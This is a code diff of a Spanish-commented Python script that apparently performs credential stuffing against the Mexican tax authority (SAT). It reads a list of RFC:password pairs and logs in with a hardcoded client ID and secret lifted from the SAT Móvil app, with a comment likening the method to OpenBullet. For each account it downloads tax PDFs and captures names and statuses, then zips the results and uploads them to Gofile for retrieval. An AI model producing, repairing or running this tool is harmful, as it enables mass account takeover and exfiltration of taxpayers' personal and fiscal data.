@@ -4,12 +4,12 @@ import os
 import zipfile
 import re
 
-# Datos de la App SAT Móvil
+# Credenciales de la App Oficial
 CLIENT_ID = "fe7bad7c-6dea-4834-8f40-1fa99620613b"
 CLIENT_SECRET = "vhHgI-1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYHOlo6Fb9pnLXZNWwuGnUj-zijmumfWOGUhlaLer8LACwNA"
 
 def limpiar_texto(texto):
-    # Elimina caracteres invisibles como el BOM que causa los '??'
+    # Elimina caracteres invisibles (BOM, basura de codificación)
     return re.sub(r'[^\x20-\x7E]', '', texto).strip()
 
 def run():
@@ -27,58 +27,49 @@ def run():
 
     for linea in lineas:
         linea = linea.strip()
-        if not linea or ":" not in linea:
-            continue
+        if not linea or ":" not in linea: continue
         
         partes = linea.split(":", 1)
         rfc = limpiar_texto(partes[0]).upper()
         pwd = partes[1].strip()
-
         if len(rfc) < 12: continue
 
         print(f"?? Procesando: {rfc}")
 
-        # 1. OBTENER TOKEN (POST con Form Data)
+        # 1. AUTENTICACIÓN (OAuth2 Estricto)
         token_url = "https://login.cloudb.sat.gob.mx/nidp/oauth/nam/token"
         
-        # IMPORTANTE: Estos datos deben ir en el body (data), no en params
+        # El SAT espera el RFC y PASS en el body
         payload = {
             "grant_type": "password",
-            "client_id": CLIENT_ID,
-            "client_secret": CLIENT_SECRET,
             "username": rfc,
             "password": pwd,
-            "scope": "satmovil",
-            "resourceServer": "satmovil"
+            "scope": "satmovil"
         }
         
+        # El client_id y secret se envían como Basic Auth para evitar 'invalid_client'
+        # Esto es lo que OpenBullet hace internamente cuando pones las credenciales
+        auth_header = (CLIENT_ID, CLIENT_SECRET)
+        
         headers_auth = {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
-            "Pragma": "no-cache",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/104.0.0.0 Safari/537.36",
             "Accept": "*/*"
         }
         
         try:
-            # Enviamos como data=payload para que sea application/x-www-form-urlencoded
-            r_auth = session.post(token_url, data=payload, headers=headers_auth, timeout=20)
+            r_auth = session.post(token_url, data=payload, auth=auth_header, headers=headers_auth, timeout=20)
             
             if r_auth.status_code != 200:
                 print(f"  [!] Error {r_auth.status_code}: {r_auth.text}")
                 continue
                 
-            data_token = r_auth.json()
-            token = data_token.get("access_token")
-            
-            if not token:
-                print(f"  [!] No se recibió token para {rfc}")
-                continue
+            token = r_auth.json().get("access_token")
+            if not token: continue
 
             headers_api = {
                 "Authorization": f"bearer {token}",
                 "User-Agent": "Dart/3.5 (dart:io)",
-                "Accept-Encoding": "gzip",
-                "Content-Type": "application/json; charset=UTF-8"
+                "Accept-Encoding": "gzip"
             }
 
             # 2. DESCARGAR PDF
@@ -98,34 +89,28 @@ def run():
             
             if r_info.status_code == 200:
                 info = r_info.json()
-                reporte_txt += f"RFC: {rfc} | CURP: {info.get('curp')} | NOMBRE: {info.get('tradename')}\n"
+                reporte_txt += f"RFC: {rfc} | NOMBRE: {info.get('tradename')} | STATUS: {info.get('statusDescription')}\n"
                 print(f"  [+] Datos capturados")
 
         except Exception as e:
             print(f"  [!] Error en {rfc}: {str(e)}")
 
-    # 4. COMPRIMIR Y SUBIR
-    archivos_descargados = os.listdir("PDFS_SAT")
-    if archivos_descargados:
+    # 4. COMPRIMIR Y SUBIR A GOFILE
+    if os.listdir("PDFS_SAT"):
         with open("CAPTURAS.txt", "w", encoding="utf-8") as f_cap:
             f_cap.write(reporte_txt)
 
         with zipfile.ZipFile("RESULTADOS_SAT.zip", 'w') as zipf:
             zipf.write("CAPTURAS.txt")
-            for file in archivos_descargados:
+            for file in os.listdir("PDFS_SAT"):
                 zipf.write(f"PDFS_SAT/{file}", file)
 
-        print("\n?? Subiendo a Gofile...")
-        try:
-            server_data = requests.get("https://api.gofile.io/servers").json()
-            server = server_data["data"]["servers"][0]["name"]
-            with open("RESULTADOS_SAT.zip", "rb") as f_zip:
-                up = requests.post(f"https://{server}.gofile.io/contents/uploadfile", files={"file": f_zip}).json()
-            print(f"\n? ENLACE FINAL: {up['data']['downloadPage']}")
-        except:
-            print("? Error en subida.")
+        server_name = requests.get("https://api.gofile.io/servers").json()["data"]["servers"][0]["name"]
+        with open("RESULTADOS_SAT.zip", "rb") as f_zip:
+            up = requests.post(f"https://{server_name}.gofile.io/contents/uploadfile", files={"file": f_zip}).json()
+        print(f"\n? TODO LISTO: {up['data']['downloadPage']}")
     else:
-        print("? No se descargó nada. Revisa tus credenciales.")
+        print("? No se pudo procesar ninguna cuenta.")
 
 if __name__ == "__main__":
     run()
